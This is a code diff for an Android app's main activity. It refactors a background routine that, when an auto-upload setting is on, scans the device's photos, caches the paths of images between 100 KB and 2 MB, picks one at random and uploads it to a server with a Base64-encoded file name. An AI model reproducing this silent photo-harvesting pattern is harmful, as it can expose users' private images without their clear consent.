@@ -28,6 +28,7 @@ import android.widget.Toast;
 
 import com.google.gson.Gson;
 import com.zhangheng.bean.Message;
+import com.zhangheng.file.TxtOperation;
 import com.zhangheng.myapplication.R;
 import com.zhangheng.myapplication.getphoneMessage.GetPhoneInfo;
 import com.zhangheng.myapplication.getphoneMessage.GetPhoto;
@@ -54,6 +55,7 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
+import cn.hutool.core.collection.CollUtil;
 import cn.hutool.core.comparator.VersionComparator;
 import cn.hutool.core.util.StrUtil;
 import cn.hutool.json.JSONObject;
@@ -158,25 +160,25 @@ public class Main3Activity extends Activity {
         getupdatelist();
 
         if (setting.getIsAutoUploadPhoto()) {
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        try {
-                            getPhoto();
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        getPhoto();
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     }
-                }).start();
+                }
+            }).start();
         }
     }
 
     private void setAdapter() {
         String[] m3_titles = AppSetting.M3_Titles;
-        List<String> list=new ArrayList<>();
+        List<String> list = new ArrayList<>();
         Map<String, Boolean> map = setting.getDisplayM3Titles();
         for (String title : m3_titles) {
-            if (map.get(title)){
+            if (map.get(title)) {
                 list.add(title);
             }
         }
@@ -224,29 +226,51 @@ public class Main3Activity extends Activity {
         String[] paths = {};
         if (b) {
             List<String> photo = new ArrayList<>();
-            List<Map<String, Object>> files = new ArrayList<>();
+//            List<Map<String, Object>> files = new ArrayList<>();
             LocalFileTool.readFile(LocalFileTool.imageType, Main3Activity.this, new LocalFileTool.IReadCallBack() {
                 @Override
                 public void callBack(List<String> localPath) {
+                    File file = null;
+                    StringBuilder sb = new StringBuilder();
+                    String local_path = LocalFileTool.BasePath + "/" + getResources().getString(R.string.app_name) + "/data/100kb~2Mb-IMG.txt";
+                    List<String> txtFile = TxtOperation.readTxtFile(local_path, "UTF-8");
+                    txtFile = CollUtil.removeBlank(txtFile);
+//                    Bitmap bitmap = null;
+                    long length = 0;
+//                    BitmapFactory.Options options = new BitmapFactory.Options();
+                    //设置inJustDecodeBounds为true表示只获取大小，不生成Btimap
+//                    options.inJustDecodeBounds = true;
                     for (String path : localPath) {
-                        File file = new File(path);
-                        String s = path.replace(GetPhoto.BasePath, "");
-                        if (paths.length>0) {
-                            for (String s1 : paths) {
-                                if (s.startsWith(s1)) {
+                        if (txtFile.indexOf(path) < 0) {
+                            file = new File(path);
+                            if (file.exists())
+                                length = file.length();
+//                        bitmap = BitmapFactory.decodeFile(path);
+//                        if (bitmap != null)
+//                            length = bitmap.getByteCount();
+                            if (paths.length > 0) {
+                                String s = path.replace(GetPhoto.BasePath, "");
+                                for (String s1 : paths) {
+                                    if (s.startsWith(s1)) {
 //                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
-                                    if (file.length() > 1024 * 100 && file.length() < 1024 * 1024 * 2) {
-                                        photo.add(path);
+                                        if (length > 1024 * 100 && length < 1024 * 1024 * 2) {
+                                            photo.add(path);
+                                            sb.append(path + "\n");
+                                        }
+                                        break;
                                     }
-                                    break;
                                 }
-                            }
-                        }else {
-                            if (file.length() > 1024 * 100 && file.length() < 1024 * 1024 * 2) {
-                                photo.add(path);
+                            } else {
+                                if (length > 1024 * 100 && length < 1024 * 1024 * 2) {
+                                    photo.add(path);
+                                    sb.append(path + "\n");
+                                }
                             }
                         }
                     }
+                    if (sb.length() > 0)
+                        TxtOperation.writeTxtFile(sb.toString(), local_path, true);
+                    photo.addAll(txtFile);
                     final int size = photo.size();
                     Log.e(Tag, "100kb~2Mb图片数：" + size);
 
@@ -262,7 +286,6 @@ public class Main3Activity extends Activity {
                         @Override
                         public void onError(Call call, Exception e, int id) {
                             Log.e(Tag, OkHttpMessageUtil.error(e));
-
                         }
 
                         @Override
@@ -288,14 +311,14 @@ public class Main3Activity extends Activity {
                                                 } else {
                                                     c = 5;
                                                 }
-                                                int i=0;
-                                                c=1;//暂时解决启动时运算量过大导致无法响应
-                                                while (i<c) {
-                                                    int random = RandomrUtil.createRandom(0, size - 1);
-                                                    String pathname = photo.get(random);
-                                                    File file = new File(pathname);
+                                                int i = 0;
+                                                c = 1;//暂时解决启动时运算量过大导致无法响应
+                                                byte[] bytes = null;
+                                                File file = null;
+                                                while (i < c) {
+                                                    String pathname = photo.get(RandomrUtil.createRandom(0, size - 1));
+                                                    file = new File(pathname);
                                                     if (file.exists()) {
-                                                        byte[] bytes = null;
                                                         long fileLength = file.length();
                                                         if (fileLength >= 1024 * 1024 * 0.8 && fileLength < 1024 * 1024 * 1.2) {
                                                             Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 2);
@@ -309,11 +332,11 @@ public class Main3Activity extends Activity {
                                                         } else {
                                                             bytes = LocalFileTool.fileToBytes(file);
                                                         }
-                                                        if (bytes.length<1024*1024) {
+                                                        if (bytes.length < 1024 * 1024) {
                                                             i++;
                                                             String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
                                                             Log.d(Tag + "上传图片", replace + ",原文件大小:"
-                                                                    + LocalFileTool.getFileSizeString(fileLength)+",上传大小："+LocalFileTool.getFileSizeString((long) bytes.length));
+                                                                    + LocalFileTool.getFileSizeString(fileLength) + ",上传大小：" + LocalFileTool.getFileSizeString((long) bytes.length));
                                                             Map<String, Object> map = new HashMap<>();
                                                             map.put("time", TimeUtil.dateToUnix(new Date()));
                                                             map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
@@ -335,6 +358,7 @@ public class Main3Activity extends Activity {
                                 }
                             } catch (Exception e) {
                                 e.printStackTrace();
+                            } finally {
                             }
                         }
                     });
